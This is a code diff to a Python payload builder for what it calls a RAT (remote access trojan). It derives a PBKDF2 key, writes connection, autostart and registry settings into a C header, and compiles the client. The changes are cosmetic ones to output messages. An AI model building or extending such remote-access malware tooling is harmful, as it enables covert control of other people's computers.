@@ -36,7 +36,7 @@ class GeneratePayload:
 
         self.key = other.generate_PBKDF2_key(password)
 
-        other.printColor("successfully","KEY PBKDF2: \n{}".format(self.key))
+        other.printColor("successfully","\nKEY PBKDF2: {}".format(self.key))
         
         try:
 
@@ -64,8 +64,8 @@ class GeneratePayload:
             other.printColor("error", str(e))
             GeneratePayload.error = True
             exit(0)
-        else:
-            other.printColor("successfully", "[+] writing in common.h is done successfully. ")
+        #else:
+        #    other.printColor("successfully", "[+] writing in common.h is done successfully. ")
 
 
     def compilate(self):
@@ -87,10 +87,11 @@ class GeneratePayload:
         os.chdir("client/src") #move 
 
         with Popen(cmd, stdout=PIPE,stderr=PIPE,shell=True) as cmd:
-            other.printColor("information","[+] compilation in progress...")
+            other.printColor("successfully","[+] compilation in progress...")
             out,err = str(cmd.stdout.read(),"UTF8",errors="ignore"),str(cmd.stderr.read(),"UTF8",errors="ignore")
             if not err:
-                print(out)
+                pass
+                #print(out)
                 
             else:
                 other.printColor("error","[-] An error is triggered when compiling the RAT.")
@@ -106,7 +107,7 @@ class GeneratePayload:
         #Choice default.
         #If the user does not add any argument in the command line.
 
-        other.printColor("information","[+] the current OS of the system: {}\n".format(self.os))
+        other.printColor("successfully","\n[+] the current OS of the system: {}".format(self.os))
 
         #print(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
         self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.registry, self.key))
